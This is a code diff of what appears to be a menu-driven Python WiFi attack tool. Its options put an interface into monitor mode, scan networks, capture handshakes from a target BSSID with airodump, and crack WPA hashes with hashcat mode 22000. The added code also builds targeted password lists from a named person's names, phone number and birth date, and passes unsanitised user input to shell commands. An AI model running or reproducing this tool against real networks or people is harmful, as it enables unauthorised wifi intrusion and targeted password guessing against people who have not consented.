+        passwords.append(f"{first_name_ti}{last_name_ti}{symbol_hash}{digit}")
+        passwords.append(f"{first_name}{last_name}{symbol_and}{digit}")
+        passwords.append(f"{first_name_ca}{last_name_ca}{symbol_and}{digit}")
+        passwords.append(f"{first_name_lo}{last_name_lo}{symbol_and}{digit}")
+        passwords.append(f"{first_name_ti}{last_name_ti}{symbol_and}{digit}")
+        
+        # Special Symbol LastName+FirstName
+        passwords.append(f"{last_name}{first_name}{symbol_at}{digit}")
+        passwords.append(f"{last_name_ca}{first_name_ca}{symbol_at}{digit}")
+        passwords.append(f"{last_name_lo}{first_name_lo}{symbol_at}{digit}")
+        passwords.append(f"{last_name_ti}{first_name_ti}{symbol_at}{digit}")
+        passwords.append(f"{last_name}{first_name}{symbol_hash}{digit}")
+        passwords.append(f"{last_name_ca}{first_name_ca}{symbol_hash}{digit}")
+        passwords.append(f"{last_name_lo}{first_name_lo}{symbol_hash}{digit}")
+        passwords.append(f"{last_name_ti}{first_name_ti}{symbol_hash}{digit}")
+        passwords.append(f"{last_name}{first_name}{symbol_and}{digit}")
+        passwords.append(f"{last_name_ca}{first_name_ca}{symbol_and}{digit}")
+        passwords.append(f"{last_name_lo}{first_name_lo}{symbol_and}{digit}")
+        passwords.append(f"{last_name_ti}{first_name_ti}{symbol_and}{digit}")
+        passwords.append(f"{digit}") 
+        passwords.append(f"{digit}{digit}")    
+                         
+    return passwords
+
+def save_to_file(passwords, filename="Custom_Passwordlist.txt"):
+    with open(filename, "w") as file:
+        for password in passwords:
+            file.write(password + "\n")
+    
+    print(Fore.RED+"-"*60)      
+    print(Fore.YELLOW+f"\nPassword list saved to {Fore.WHITE}'{filename}'\n")
+    print(Fore.RED+"-"*60)
+
 
 def hash_crack(list_path, hash_path):
     command = f"gnome-terminal -- bash -c 'hashcat -m 22000 {hash_path} {list_path}'"
@@ -381,35 +418,41 @@ def hash_crack(list_path, hash_path):
 def main():
     cl()
     banner()
+    time.sleep(3)
 
     if not check_root():
         print(Fore.RED + "\n[!] This script must be run as root (use sudo)" + Fore.RESET)
-        sys.exit(1)
+        os._exit(0)
 
     home_menu()
-    home_input = input(Fore.CYAN + "\n>>>> " + Fore.WHITE)
+    home_input = input(Fore.CYAN + "\n\n>>>> " + Fore.WHITE)
 
     if home_input == "1":
         cl()
         banner()
+        time.sleep(4)
+        print(Fore.YELLOW+"\nWait sometimes process loading........")
         monitor_mode()
         back_home()
 
     elif home_input == "2":
         cl()
         banner()
+        time.sleep(3)
         interface = input(Fore.LIGHTBLUE_EX + "\nEnter Interface Name [wlan0] >>> " + Fore.WHITE)
-        print(Fore.RED + "\nSTOP THIS PROCESS (CTRL+C)" + Fore.RESET)
+        print(Fore.RED + "\nSTOP PROCESS (CTRL+C)")
+        input(Fore.CYAN+"\nStart wifi scan press Enter >> ")
         wifi_scan(interface)
         back_home()
 
     elif home_input == "3":
         cl()
         banner()
+        time.sleep(3)
         bssid = input(Fore.LIGHTMAGENTA_EX + "\nEnter Target Wifi BSSID >> " + Fore.WHITE)
-        interface = input(Fore.LIGHTBLUE_EX + "Enter Interface Name [wlan0] >> " + Fore.WHITE)
-        channel = input(Fore.YELLOW + "Enter Channel >> " + Fore.WHITE)
-        filename = input(Fore.GREEN + "Enter File Name (without extension) >> " + Fore.WHITE)
+        interface = input(Fore.LIGHTBLUE_EX + "\nEnter Interface Name [wlan0] >> " + Fore.WHITE)
+        channel = input(Fore.YELLOW + "\nEnter Channel >> " + Fore.WHITE)
+        filename = input(Fore.GREEN + "\nEnter File Name (without extension) >> " + Fore.WHITE)
 
         input(Fore.RED + "\nPress Enter when enough packets are captured to start cracking..." + Fore.RESET)
         start_airodump(interface, bssid, channel, filename)
@@ -419,6 +462,7 @@ def main():
     elif home_input == "4":
         cl()
         banner()
+        time.sleep(3)
         cap_file = input(Fore.LIGHTBLUE_EX + "\nEnter the path to your .cap file: " + Fore.WHITE)
         output_file = input(Fore.LIGHTYELLOW_EX + "Enter the output .22000 file path: " + Fore.WHITE)
         
@@ -428,26 +472,84 @@ def main():
     elif home_input == "5":
         cl()
         banner()
-        first_nm = input("\nEnter Target First Name >> ").title()
-        middle_nm = input("Enter Target Middle Name (if none then skip) >> ").title()
-        last_nm = input("Enter Target Last Name >> ").title()
-        print("\nIt tooks take time depend on your device capability\nWait Sometimes.......\n")
-        random_case = (random.choice(string.ascii_uppercase)+random.choice(string.ascii_uppercase))
-        file_name = (f"Wifi_attack_{first_nm}_{random_case}.txt")
+        time.sleep(3)
+        first_name = input(Fore.CYAN+f"\nEnter Target First Name >>{Fore.GREEN} ").strip()
+        middle_name = input(Fore.CYAN+f"Enter Target Middle Name {Fore.YELLOW}(leave blank if none) >>{Fore.GREEN} ").strip()
+        last_name = input(Fore.CYAN+f"Enter Target Last Name >>{Fore.GREEN} ").strip()
         
-        password_list = pass_generator(first_nm,middle_nm,last_nm)
-
-        save_file(password_list, file_name)
+        first_name_ca = first_name.upper()
+        first_name_lo = first_name.lower()
+        first_name_ti = first_name.title()
+        middle_name_ca = middle_name.upper()
+        middle_name_lo = middle_name.lower()
+        middle_name_ti = middle_name.title()
+        last_name_ca = last_name.upper()
+        last_name_lo = last_name.lower()
+        last_name_ti = last_name.title()
+        
+        phone_num = input(Fore.CYAN+f"Target Phone Number {Fore.YELLOW}(leave blank if none) >>{Fore.GREEN} ").strip()
+        
+        birth_day = input(Fore.CYAN+f"\nTarget Birth Day {Fore.YELLOW}(leave blank if none) >>{Fore.GREEN} ")
+        birth_month = input(Fore.CYAN+f"Target Birth Month {Fore.YELLOW}(leave blank if none) >>{Fore.GREEN} ")
+        birth_year = input(Fore.CYAN+f"Target Birth Year {Fore.YELLOW}(leave blank if none) >>{Fore.GREEN} ")
+        
+        case1 = random.choice(string.ascii_letters)
+        case2 = random.choice(string.digits)
+        random_case = (f"{first_name.upper()}_{case1}{case2}")
+        
+        file_name = (f"Passwordlist_{random_case}.txt")
+        
+        password_list = generate_password_list(first_name, middle_name, last_name,
+                                            first_name_ca, 
+                                            first_name_lo,
+                                            first_name_ti,
+                                            middle_name_ca,
+                                            middle_name_lo,
+                                            middle_name_ti,
+                                            last_name_ca,
+                                            last_name_lo,
+                                            last_name_ti,
+                                            phone_num,
+                                            birth_day,
+                                            birth_month,
+                                            birth_year,
+                                            )
+                                        
+        
+        save_to_file(password_list, file_name)
         back_home()
         
     elif home_input == "6":
         cl()
         banner()
+        time.sleep(3)
         hash_path = input(f"\n{Fore.LIGHTYELLOW_EX}Enter Hash file path [hack.22000] >>{Fore.CYAN} ")
         list_path = input(f"\n{Fore.YELLOW}Enter Password List Path [passlist.txt] >>{Fore.CYAN} ")
         
         hash_crack(list_path, hash_path)
-                 
-
+        back_home()    
+    
+    elif home_input == "7":
+        cl()
+        banner()
+        time.sleep(2)
+        crack_file_name = input(f"\n{Fore.YELLOW}Enter File Name [example-01.cap] >>> {Fore.WHITE}")
+        
+        try:
+            if os.geteuid() == 0:
+                os.system(f"hashcat --show -m 22000 {crack_file_name}")
+            else:
+                os.system(f"sudo hashcat --show -m 22000 {crack_file_name}")
+    
+        except ValueError:
+            print(Fore.RED+"\nFile Not Found Try Again\n")
+            
+        back_home()
+    
+    else:
+        back_home()
+    
+       
+        
 if __name__ == "__main__":
     main()
